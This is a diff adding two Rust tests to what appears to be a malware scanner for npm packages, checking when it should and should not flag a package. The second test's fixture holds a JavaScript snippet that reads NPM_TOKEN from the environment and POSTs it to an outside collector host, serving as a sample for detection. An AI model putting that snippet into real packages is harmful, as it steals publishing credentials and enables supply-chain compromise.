@@ -295,6 +295,53 @@ fn scanner_detects_fs_access() {
     println!("Scanner findings: {:#?}", report.findings);
 }
 
+#[test]
+fn scanner_does_not_correlate_unrelated_files() {
+    let dir = TempDir::new().unwrap();
+    fs::write(
+        dir.path().join("package.json"),
+        r#"{"name":"auth-client","version":"1.0.0"}"#,
+    )
+    .unwrap();
+    fs::write(
+        dir.path().join("token.js"),
+        r#"module.exports = process.env.DEPLOY_TOKEN;"#,
+    )
+    .unwrap();
+    fs::write(
+        dir.path().join("client.js"),
+        r#"module.exports = (url) => fetch(url);"#,
+    )
+    .unwrap();
+
+    let report = PackageScanner::scan("auth-client", "1.0.0", dir.path()).unwrap();
+    assert_eq!(report.overall_risk, RiskLevel::Info);
+    assert!(report.capabilities.env_access);
+    assert!(report.capabilities.network);
+}
+
+#[test]
+fn scanner_still_flags_correlated_exfiltration() {
+    let dir = TempDir::new().unwrap();
+    fs::write(
+        dir.path().join("package.json"),
+        r#"{"name":"stealer","version":"1.0.0"}"#,
+    )
+    .unwrap();
+    fs::write(
+        dir.path().join("index.js"),
+        r#"
+        const token = process.env.NPM_TOKEN;
+        fetch("https://collector.oastify.com", { method: "POST", body: token });
+        "#,
+    )
+    .unwrap();
+
+    let report = PackageScanner::scan("stealer", "1.0.0", dir.path()).unwrap();
+    assert_eq!(report.overall_risk, RiskLevel::Critical);
+    assert!(!report.verdict_reasons.is_empty());
+}
+
 // ---- REAL PACKAGE TEST: scan express from node_modules ----
 
 #[test]
